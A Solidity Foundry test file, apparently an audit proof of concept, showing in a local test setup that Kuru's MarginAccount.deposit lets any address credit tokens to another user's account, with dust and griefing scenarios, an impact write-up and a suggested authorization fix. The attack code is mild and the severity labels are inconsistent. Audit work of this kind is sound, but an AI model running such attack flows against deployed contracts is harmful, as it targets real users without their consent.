//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {FixedPointMathLib} from "../contracts/libraries/FixedPointMathLib.sol";
import {OrderBookErrors, KuruAMMVaultErrors, MarginAccountErrors} from "../contracts/libraries/Errors.sol";
import {IOrderBook} from "../contracts/interfaces/IOrderBook.sol";
import {KuruAMMVault} from "../contracts/KuruAMMVault.sol";
import {OrderBook} from "../contracts/OrderBook.sol";
import {KuruForwarder} from "../contracts/KuruForwarder.sol";
import {MarginAccount} from "../contracts/MarginAccount.sol";
import {Router} from "../contracts/Router.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MintableERC20} from "./lib/MintableERC20.sol";

contract POC is Test {
    // These are all configurable parameters
    uint96 constant SIZE_PRECISION = 10 ** 10;
    uint32 constant PRICE_PRECISION = 10 ** 4;
    uint32 constant TICK_SIZE = 10 ** 2;
    uint96 constant MIN_SIZE = 10 ** 8;
    uint96 constant MAX_SIZE = 10 ** 14;
    uint256 constant TAKER_FEE_BPS = 0;
    uint256 constant MAKER_FEE_BPS = 0;
    uint96 constant VAULT_SPREAD = 30;

    address BASE_TOKEN;
    address QUOTE_TOKEN;
    Router router;
    MarginAccount marginAccount;
    KuruForwarder kuruForwarder;
    OrderBook orderBook;
    KuruAMMVault kuruAmmVault;

    address FEE_COLLECTOR = makeAddr("FEE_COLLECTOR");

    function setUp() public {
        // Configure the market type as you need
        OrderBook.OrderBookType _type = IOrderBook.OrderBookType.NO_NATIVE;
        if (uint8(_type) == 0) {
            // NO_NATIVE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            MintableERC20 quoteToken = new MintableERC20("QUOTE Token", "QUOTE");
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 1) {
            // NATIVE_IN_BASE
            BASE_TOKEN = address(0);
            MintableERC20 quoteToken = new MintableERC20("QUOTE Token", "QUOTE");
            QUOTE_TOKEN = address(quoteToken);
        } else if (uint8(_type) == 2) {
            // NATIVE_IN_QUOTE
            MintableERC20 baseToken = new MintableERC20("BASE Token", "BASE");
            BASE_TOKEN = address(baseToken);
            QUOTE_TOKEN = address(0);
        }

        Router routerImplementation = new Router();
        MarginAccount marginAccountImplementation = new MarginAccount();
        OrderBook orderBookImplementation = new OrderBook();
        KuruAMMVault kuruAmmVaultImplementation = new KuruAMMVault();
        KuruForwarder kuruForwarderImplementation = new KuruForwarder();
        router = Router(payable(new ERC1967Proxy(address(routerImplementation), "")));
        kuruForwarder = KuruForwarder((address(new ERC1967Proxy(address(kuruForwarderImplementation), ""))));
        marginAccount = MarginAccount(payable(new ERC1967Proxy(address(marginAccountImplementation), "")));
        bytes4[] memory allowedInterfaces = new bytes4[](6);
        allowedInterfaces[0] = OrderBook.addBuyOrder.selector;
        allowedInterfaces[1] = OrderBook.addSellOrder.selector;
        allowedInterfaces[2] = OrderBook.placeAndExecuteMarketBuy.selector;
        allowedInterfaces[3] = OrderBook.placeAndExecuteMarketSell.selector;
        allowedInterfaces[4] = MarginAccount.deposit.selector;
        kuruForwarder.initialize(address(this), allowedInterfaces);
        marginAccount.initialize(address(this), address(router), FEE_COLLECTOR, address(kuruForwarder));
        router.initialize(
            address(this),
            address(marginAccount),
            address(orderBookImplementation),
            address(kuruAmmVaultImplementation),
            address(kuruForwarder)
        );
        orderBook = OrderBook(router.deployProxy(
            _type,
            BASE_TOKEN,
            QUOTE_TOKEN,
            SIZE_PRECISION,
            PRICE_PRECISION,
            TICK_SIZE,
            MIN_SIZE,
            MAX_SIZE,
            TAKER_FEE_BPS,
            MAKER_FEE_BPS,
            VAULT_SPREAD
        ));
    }

    function test_POC_accessibility() public {
        console.log("POC_accessibility");
        console.log("Vault address: ", address(kuruAmmVault));
        console.log("Router address: ", address(router));
        console.log("Margin account address: ", address(marginAccount));
        console.log("Order book address: ", address(orderBook));
    }

    /**
     * @notice Demonstrates a critical vulnerability in MarginAccount.deposit()
     * @dev The vulnerability allows anyone to deposit tokens on behalf of any user
     *      without the user's consent or approval. This can be exploited for:
     *      1. Griefing attacks - forcing unwanted tokens on users
     *      2. Tax implications - users may face tax liabilities for unwanted deposits
     *      3. Dust attacks - depositing small amounts of malicious tokens
     *      4. Breaking user accounting/expectations
     */
    function test_POC_unauthorized_deposit_on_behalf_of_others() public {
        console.log("=== CRITICAL VULNERABILITY: UNAUTHORIZED DEPOSITS ===");
        console.log("");
        
        // Setup: Create victim and attacker
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        
        uint256 depositAmount = 1000 * 10**18;
        
        // Mint tokens to attacker
        MintableERC20(BASE_TOKEN).mint(attacker, depositAmount);
        
        console.log("=== INITIAL STATE ===");
        console.log("Victim's BASE token balance in MarginAccount:", marginAccount.getBalance(victim, BASE_TOKEN));
        console.log("Attacker's BASE token balance:", MintableERC20(BASE_TOKEN).balanceOf(attacker));
        
        // Attacker can deposit tokens on behalf of victim WITHOUT victim's consent
        vm.startPrank(attacker);
        
        // Approve MarginAccount to spend attacker's tokens
        MintableERC20(BASE_TOKEN).approve(address(marginAccount), depositAmount);
        
        console.log("");
        console.log("=== VULNERABILITY DEMONSTRATION ===");
        console.log("Attacker depositing tokens on behalf of victim WITHOUT victim's consent...");
        
        // This should NOT be allowed, but it is!
        marginAccount.deposit(victim, BASE_TOKEN, depositAmount);
        
        vm.stopPrank();
        
        console.log("");
        console.log("=== POST-ATTACK STATE ===");
        console.log("Victim's BASE token balance in MarginAccount:", marginAccount.getBalance(victim, BASE_TOKEN));
        console.log("Attacker's BASE token balance:", MintableERC20(BASE_TOKEN).balanceOf(attacker));
        
        // Verify the attack succeeded
        assertEq(marginAccount.getBalance(victim, BASE_TOKEN), depositAmount);
        assertEq(MintableERC20(BASE_TOKEN).balanceOf(attacker), 0);
        
        console.log("");
        console.log("VULNERABILITY CONFIRMED: Attacker successfully deposited tokens on behalf of victim!");
        
        console.log("");
        console.log("=== ATTACK SCENARIOS ===");
        console.log("1. GRIEFING: Attacker forces unwanted tokens on users");
        console.log("2. TAX IMPLICATIONS: Users may face tax liabilities for unwanted deposits");
        console.log("3. DUST ATTACKS: Depositing small amounts of malicious/worthless tokens");
        console.log("4. ACCOUNTING ISSUES: Breaking user's expected token balances");
        console.log("5. MALICIOUS TOKENS: Depositing tokens with transfer hooks or other malicious behavior");
        
        console.log("");
        console.log("=== IMPACT ANALYSIS ===");
        console.log("SEVERITY: MEDIUM-HIGH");
        console.log("- Users cannot prevent unwanted deposits");
        console.log("- Potential tax and legal implications");
        console.log("- Can be used for harassment/griefing");
        console.log("- May interfere with user strategies/accounting");
        
        console.log("");
        console.log("=== RECOMMENDED FIX ===");
        console.log("Add authorization check:");
        console.log("require(_user == msg.sender || approved[_user][msg.sender], 'Unauthorized deposit');");
        console.log("Or implement an allowlist/approval system for third-party deposits");
    }
    
    /**
     * @notice Demonstrates a dust attack using the unauthorized deposit vulnerability
     */
    function test_POC_dust_attack_scenario() public {
        console.log("=== DUST ATTACK SCENARIO ===");
        console.log("");
        
        // Create multiple victims
        address[] memory victims = new address[](5);
        for (uint i = 0; i < 5; i++) {
            victims[i] = makeAddr(string(abi.encodePacked("victim", i)));
        }
        
        address attacker = makeAddr("attacker");
        uint256 dustAmount = 1; // 1 wei dust attack
        
        // Mint tokens to attacker for dust attack
        MintableERC20(BASE_TOKEN).mint(attacker, dustAmount * victims.length);
        
        vm.startPrank(attacker);
        MintableERC20(BASE_TOKEN).approve(address(marginAccount), dustAmount * victims.length);
        
        console.log("Attacker performing dust attack on", victims.length, "victims...");
        
        // Dust attack: deposit tiny amounts to many users
        for (uint i = 0; i < victims.length; i++) {
            marginAccount.deposit(victims[i], BASE_TOKEN, dustAmount);
            console.log("Dusted victim", i, "- Balance:", marginAccount.getBalance(victims[i], BASE_TOKEN));
        }
        
        vm.stopPrank();
        
        console.log("");
        console.log("DUST ATTACK COMPLETED:");
        console.log("- Affected", victims.length, "users without their consent");
        console.log("- Each victim now has unwanted token balance");
        console.log("- Can be scaled to thousands of users");
        console.log("- Victims must now track/manage these unwanted balances");
    }
    
    /**
     * @notice Demonstrates potential tax implications of unauthorized deposits
     */
    function test_POC_tax_implication_attack() public {
        console.log("=== TAX IMPLICATION ATTACK ===");
        console.log("");
        
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        
        // Large deposit that could have tax implications
        uint256 largeAmount = 100000 * 10**18; // $100k worth of tokens
        
        MintableERC20(BASE_TOKEN).mint(attacker, largeAmount);
        
        vm.startPrank(attacker);
        MintableERC20(BASE_TOKEN).approve(address(marginAccount), largeAmount);
        
        console.log("Attacker depositing large amount on behalf of victim...");
        console.log("Amount:", largeAmount);
        
        // Deposit large amount on behalf of victim
        marginAccount.deposit(victim, BASE_TOKEN, largeAmount);
        
        vm.stopPrank();
        
        console.log("");
        console.log("ATTACK IMPACT:");
        console.log("- Victim now has large token balance they didn't request");
        console.log("- May trigger tax reporting requirements");
        console.log("- Victim may be liable for taxes on 'received' tokens");
        console.log("- Creates unwanted legal/financial obligations");
        console.log("- Victim balance:", marginAccount.getBalance(victim, BASE_TOKEN));
        
        assertEq(marginAccount.getBalance(victim, BASE_TOKEN), largeAmount);
    }
}